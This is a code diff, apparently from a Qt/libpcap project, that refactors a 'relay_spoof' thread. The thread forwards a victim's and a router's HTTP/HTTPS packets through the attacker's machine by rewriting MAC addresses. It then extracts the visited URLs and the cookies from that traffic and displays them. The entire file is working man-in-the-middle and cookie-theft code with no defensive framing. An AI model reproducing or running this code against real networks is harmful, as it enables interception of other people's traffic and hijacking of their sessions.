@@ -14,85 +14,84 @@ int flag_check_get(u_char *a, u_char *b);
 void getUrl(u_char *packet, int len);
 void sendUrl(u_char *packet, int len);
 
-QStringList url_list, dataList;
+QStringList relay_url_list, relay_data_list;
 int get_broad_cnt = 0, test_cnt = 0;
 
-relay_spoof::relay_spoof(QObject *parent) : QThread(parent)
-{
+u_char spoofAtkMac[6], spoofRouterMac[6], spoofVictimMac[6];
+pcap_t *spoofPcap;
+pcap_if_t *spoofDevs;
+
+relay_spoof::relay_spoof(QObject *parent) : QThread(parent) {
 
 }
-
-pcap_t *get_pcap;
-u_char myMac_get[6], routerMac_get[6], victimMac_get[6];
 
 void relay_spoof::run() {
     int cnt = 0, i = 0;
     bpf_u_int32 netp, maskp;
     struct bpf_program filter;
     char errbuf[PCAP_ERRBUF_SIZE];
-    char *dev;
     struct pcap_pkthdr *pkthdr;
     u_char *packet;
     struct libnet_ethernet_hdr *eth;
 
-    dev = pcap_lookupdev(errbuf);
-    if(pcap_lookupnet(dev, &netp, &maskp, errbuf) == -1) exit(1);
-    get_pcap = pcap_open_live(dev, 65535, 0, -1, errbuf);
-    if(pcap_compile(get_pcap, &filter, "tcp port 80 or tcp port 443 or tcp port 8080", 0, maskp) == -1) exit(1);
-    if(pcap_setfilter(get_pcap, &filter) == -1) exit(1);
+    if(pcap_lookupnet(spoofDevs->name, &netp, &maskp, errbuf) == -1) exit(1);
+    spoofPcap = pcap_open_live(spoofDevs->name, 65535, 0, -1, errbuf);
+    if(pcap_compile(spoofPcap, &filter, "tcp port 80 or tcp port 443 or tcp port 8080", 0, maskp) == -1) exit(1);
+    if(pcap_setfilter(spoofPcap, &filter) == -1) exit(1);
 
-    get_mac_filter(my_mac.toLatin1().data(), myMac_get);
-    get_mac_filter(router_mac.toLatin1().data(), routerMac_get);
-    get_mac_filter(victim_mac.toLatin1().data(), victimMac_get);
+    get_mac_filter(relayAtkMac.toLatin1().data(), spoofAtkMac);
+    get_mac_filter(relayRouterMac.toLatin1().data(), spoofRouterMac);
+    get_mac_filter(relayVictimMac.toLatin1().data(), spoofVictimMac);
 
-    get_stop = false;
+    spoofStop = false;
+
     while(1) {
-        while((cnt = pcap_next_ex(get_pcap, &pkthdr, (const u_char**)&packet)) > 0) {
+        while((cnt = pcap_next_ex(spoofPcap, &pkthdr, (const u_char**)&packet)) > 0) {
             eth = (struct libnet_ethernet_hdr *)packet;
 
-            if(flag_check_get(eth->ether_dhost, myMac_get) != 1 && flag_check_get(eth->ether_shost, routerMac_get) == 1 && flag_check_get(eth->ether_shost, victimMac_get) != 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
+            if(flag_check_get(eth->ether_dhost, spoofAtkMac) != 1 && flag_check_get(eth->ether_shost, spoofRouterMac) == 1 && flag_check_get(eth->ether_shost, spoofVictimMac) != 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
                 for(i = 0; i < ETHER_ADDR_LEN; i++) {
-                    *(packet+i) = *(routerMac_get+i);
-                    *(packet+ETHER_ADDR_LEN+i) = *(myMac_get+i);
+                    *(packet + i) = *(spoofRouterMac + i);
+                    *(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
                 }
-                pcap_sendpacket(get_pcap, packet, pkthdr->len);
+                pcap_sendpacket(spoofPcap, packet, pkthdr->len);
 //                printf("\n##### Host Get Packet #####\n");
 //                get_print_packet(pkthdr->len, packet);
                 getUrl(packet, pkthdr->len);
                 if(get_broad_cnt != test_cnt) {
-                    emit urlList(url_list);
+                    emit relay_urlList(relay_url_list);
                     test_cnt++;
                 }
             }
-            if(flag_check_get(eth->ether_dhost, myMac_get) != 1 && flag_check_get(eth->ether_shost, routerMac_get) != 1 && flag_check_get(eth->ether_shost, victimMac_get) == 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
+            if(flag_check_get(eth->ether_dhost, spoofAtkMac) != 1 && flag_check_get(eth->ether_shost, spoofRouterMac) != 1 && flag_check_get(eth->ether_shost, spoofVictimMac) == 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
                 for(i = 0; i < ETHER_ADDR_LEN; i++) {
-                    *(packet+i) = *(victimMac_get+i);
-                    *(packet+ETHER_ADDR_LEN+i) = *(myMac_get+i);
+                    *(packet + i) = *(spoofVictimMac + i);
+                    *(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
                 }
-                pcap_sendpacket(get_pcap, packet, pkthdr->len);
+                pcap_sendpacket(spoofPcap, packet, pkthdr->len);
 //                printf("\n##### DNS Packet #####\n");
 //                get_print_packet(length, packet);
                 sendUrl(packet, pkthdr->len);
             }
         }
-        if(get_stop) break;
+        if(spoofStop) break;
     }
-    emit data_list(dataList);
-    emit spoof_fin(true);
+    emit relay_dataList(relay_data_list);
+    emit relay_spoofFin(true);
 }
 
 void get_mac_filter(char *get, u_char *my) {	// owner mac address save at my_mac variable
     int i, j = 0;
     for(i = 0; i < ETHER_ADDR_LEN; i++) {
-        if(*(get+j) < 'a') {
+        if(*(get+j) < 'A') {
             *(my+i) = (*(get+j) - '0') * 0x10;
-            if(*(get+j+1) < 'a') *(my+i) += (*(get+j+1) - '0') * 0x01;
-            else *(my+i) += (*(get+j+1) == 'a') ? 0x0a : ((*(get+j+1) == 'b') ? 0x0b : ((*(get+j+1) == 'c') ? 0x0c : ((*(get+j+1) == 'd') ? 0x0d : ((*(get+j+1) == 'e') ? 0x0e : 0x0f))));
+            if(*(get+j+1) < 'A') *(my+i) += (*(get+j+1) - '0') * 0x01;
+            else *(my+i) += (*(get+j+1) == 'A') ? 0x0A : ((*(get+j+1) == 'B') ? 0x0B : ((*(get+j+1) == 'C') ? 0x0C : ((*(get+j+1) == 'D') ? 0x0D : ((*(get+j+1) == 'E') ? 0x0E : 0x0F))));
         }
         else {
-            *(my+i) = (*(get+j) == 'a') ? 0xa0 : ((*(get+j) == 'b') ? 0xb0 : ((*(get+j) == 'c') ? 0xc0 : ((*(get+j) == 'd') ? 0xd0 : ((*(get+j) == 'e') ? 0xe0 : 0xf0))));
-            if(*(get+j+1) < 'a') *(my+i) += (*(get+j+1) - '0') * 0x01;
-            else *(my+i) += (*(get+j+1) == 'a') ? 0x0a : ((*(get+j+1) == 'b') ? 0x0b : ((*(get+j+1) == 'c') ? 0x0c : ((*(get+j+1) == 'd') ? 0x0d : ((*(get+j+1) == 'e') ? 0x0e : 0x0f))));
+            *(my+i) = (*(get+j) == 'A') ? 0xA0 : ((*(get+j) == 'B') ? 0xB0 : ((*(get+j) == 'C') ? 0xC0 : ((*(get+j) == 'D') ? 0xD0 : ((*(get+j) == 'E') ? 0xE0 : 0xF0))));
+            if(*(get+j+1) < 'A') *(my+i) += (*(get+j+1) - '0') * 0x01;
+            else *(my+i) += (*(get+j+1) == 'A') ? 0x0A : ((*(get+j+1) == 'B') ? 0x0B : ((*(get+j+1) == 'C') ? 0x0C : ((*(get+j+1) == 'D') ? 0x0D : ((*(get+j+1) == 'E') ? 0x0E : 0x0F))));
         }
         j += 2;
     }
@@ -161,11 +160,11 @@ void getUrl(u_char *packet, int len) {
                     }
                     else if(tempStr.length() == (++i)) break;
                 }
-                if(!url_list.isEmpty()) for(tmp = 0; tmp < url_list.length(); tmp++) if(url_list.at(tmp) == imsi) cnt = 100;
+                if(!relay_url_list.isEmpty()) for(tmp = 0; tmp < relay_url_list.length(); tmp++) if(relay_url_list.at(tmp) == imsi) cnt = 100;
                 if(cnt != 100) {
                     get_broad_cnt++;
                     imsi.detach();
-                    url_list.append(imsi);
+                    relay_url_list.append(imsi);
                 }
             }
             if(tempStr.length() <= (++i)) break;
@@ -179,14 +178,14 @@ void getUrl(u_char *packet, int len) {
                         imsi.append(tempStr.at(i++));
                         if(tempStr.at(i) == '.' && tempStr.at(i+1) == '.' && tempStr.at(i+2) == '.' && tempStr.at(i+3) == '.') break;
                     }
-                    dataList.append(imsi);
+                    relay_data_list.append(imsi);
                     break;
                 }
                 else if(tempStr.length() == (++i)) break;
             }
         }
-        else dataList.append("Not exist cookie");
-        qDebug() << "#####Cookie : " << dataList.at(get_broad_cnt - 1);
+        else relay_data_list.append("Not exist cookie");
+        qDebug() << "#####Cookie : " << relay_data_list.at(get_broad_cnt - 1);
     }
 }
 
@@ -197,8 +196,9 @@ void sendUrl(u_char *packet, int len) {
 //    qDebug() << "sendUrl : " << tempStr;
 }
 
-void relay_spoof::mac_get(QString v, QString m, QString r) {
-    victim_mac = v;
-    my_mac = m;
-    router_mac = r;
+void relay_spoof::relayGetMacInfo(QString victim, QString atk, QString router, pcap_if_t *devs) {
+    relayVictimMac = victim;
+    relayAtkMac = atk;
+    relayRouterMac = router;
+    spoofDevs = devs;
 }
